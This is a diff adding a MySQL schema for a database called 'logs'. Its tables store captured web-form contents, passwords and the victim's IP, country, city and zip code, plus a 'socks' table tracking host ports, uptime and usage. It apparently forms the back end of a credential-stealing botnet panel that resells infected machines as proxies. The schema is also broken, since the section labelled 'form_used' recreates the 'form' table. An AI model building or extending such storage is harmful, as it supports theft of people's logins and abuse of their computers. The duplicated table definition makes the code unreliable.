@@ -1,0 +1,79 @@
+CREATE DATABASE `logs`;
+USE logs;
+
+-- --------------------------------------------------------
+
+-- 
+-- Table structure for table `form`
+-- 
+
+CREATE TABLE `form` (
+  `form_id` int(5) unsigned NOT NULL auto_increment,
+  `add_date` datetime NOT NULL default '0000-00-00 00:00:00',
+  `id` varchar(4) default NULL,
+  `uidlog` varchar(50) default NULL,
+  `ip_real` varchar(15) default NULL,
+  `ip` varchar(15) default NULL,
+  `form` longtext,
+  `country` varchar(50) default NULL,
+  `city` varchar(50) default NULL,
+  `zip` varchar(10) default NULL,
+  PRIMARY KEY  (`form_id`)
+) ENGINE=MyISAM;
+
+-- --------------------------------------------------------
+
+-- 
+-- Table structure for table `pass`
+-- 
+
+CREATE TABLE `pass` (
+  `add_date` datetime default '0000-00-00 00:00:00',
+  `id` varchar(4) default NULL,
+  `uidlog` varchar(50) default NULL,
+  `ip_real` varchar(15) default NULL,
+  `ip` varchar(15) default NULL,
+  `pass` longtext,
+  `country` varchar(50) default NULL,
+  `city` varchar(50) default NULL,
+  `zip` varchar(10) default NULL
+) ENGINE=MyISAM;
+
+-- --------------------------------------------------------
+
+-- 
+-- Table structure for table `socks`
+-- 
+
+CREATE TABLE `socks` (
+  `uid` varchar(50) NOT NULL default '',
+  `ip` varchar(15) NOT NULL default '',
+  `hport` int(5) unsigned NOT NULL default '0',
+  `sport` int(5) unsigned NOT NULL default '0',
+  `uptime` varchar(5) NOT NULL default '',
+  `update` int(13) unsigned NOT NULL default '0',
+  `used` int(1) unsigned default '0',
+  PRIMARY KEY  (`uid`)
+) ENGINE=MyISAM;
+
+-- --------------------------------------------------------
+
+-- 
+-- Table structure for table `form_used`
+-- 
+
+CREATE TABLE `form` (
+  `form_id` int(5) unsigned NOT NULL auto_increment,
+  `add_date` datetime NOT NULL default '0000-00-00 00:00:00',
+  `id` varchar(4) default NULL,
+  `uidlog` varchar(50) default NULL,
+  `ip_real` varchar(15) default NULL,
+  `ip` varchar(15) default NULL,
+  `form` longtext,
+  `country` varchar(50) default NULL,
+  `city` varchar(50) default NULL,
+  `zip` varchar(10) default NULL,
+  PRIMARY KEY  (`form_id`)
+) ENGINE=MyISAM;
+
+-- --------------------------------------------------------
